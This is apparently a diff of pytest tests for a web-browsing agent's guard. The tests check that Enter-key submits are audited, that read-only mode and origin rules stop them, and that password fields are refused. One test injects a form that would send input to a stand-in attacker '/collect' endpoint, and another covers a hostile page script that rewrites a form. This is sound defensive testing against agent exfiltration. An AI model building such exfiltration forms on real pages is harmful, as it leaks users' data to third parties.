@@ -174,3 +174,59 @@ def test_page_without_elements_says_so(site, tmp_path, monkeypatch):
         assert "(no interactive elements)" in await s.observe()
 
     run(site, tmp_path, monkeypatch, scenario)
+
+
+def test_enter_in_a_get_form_field_runs_the_search_and_is_audited(site, tmp_path, monkeypatch):
+    async def scenario(s, audit):
+        obs = await s.navigate(site.portal_url + "/orders/1")
+        await s.act("type", ref(obs, "q"), "abc")
+        out = await s.act("press", ref(obs, "q"))
+        assert "Resultado da busca" in out and site.searches == 1
+        log = audit.path.read_text(encoding="utf-8")
+        assert '"action":"press"' in log.replace('": "', '":"') and "press_ok" in log
+
+    run(site, tmp_path, monkeypatch, scenario)
+
+
+def test_enter_in_a_post_form_is_denied_in_read_only(site, tmp_path, monkeypatch):
+    async def scenario(s, audit):
+        obs = await s.navigate(site.portal_url + "/orders/1")
+        out = await s.act("press", ref(obs, "msg"))
+        assert out == "DENIED (read_only_submit)" and site.contact == []
+
+    run(site, tmp_path, monkeypatch, scenario)
+
+
+def test_enter_that_submits_a_rewritten_form_is_stopped_by_the_guard(site, tmp_path, monkeypatch):
+    """Same page and script as the click case: Enter must not be a way around the guard."""
+
+    async def scenario(s, audit):
+        obs = await s.navigate(site.portal_url + "/orders/1")
+        out = await s.act("press", ref(obs, "msg"))
+        assert site.attacker_hits == [] and site.contact == []
+        assert "blocked by runtime" in out and "origin_not_allowed" in out
+
+    run(site, tmp_path, monkeypatch, scenario, read_only=False)
+
+
+def test_enter_in_a_form_that_posts_to_another_origin_is_denied(site, tmp_path, monkeypatch):
+    async def scenario(s, audit):
+        await s.page.set_content(
+            f"<form method=get action='{site.attacker_url}/collect'><input name=q></form>"
+        )
+        obs = await s.observe()
+        out = await s.act("press", ref(obs, "q"))
+        assert out == "DENIED (form_destination_not_allowed)" and site.attacker_hits == []
+
+    run(site, tmp_path, monkeypatch, scenario)
+
+
+def test_press_is_limited_to_enter_in_text_fields(site, tmp_path, monkeypatch):
+    async def scenario(s, audit):
+        obs = await s.navigate(site.portal_url + "/orders/1")
+        assert await s.act("press", ref(obs, "pw2")) == "DENIED (agent_cannot_type_passwords)"
+        assert await s.act("press", ref(obs, "Buscar")) == "DENIED (not_a_text_field)"
+        assert await s.act("press", ref(obs, "q"), "Tab") == "DENIED (unsupported_key)"
+        assert site.searches == 0
+
+    run(site, tmp_path, monkeypatch, scenario)
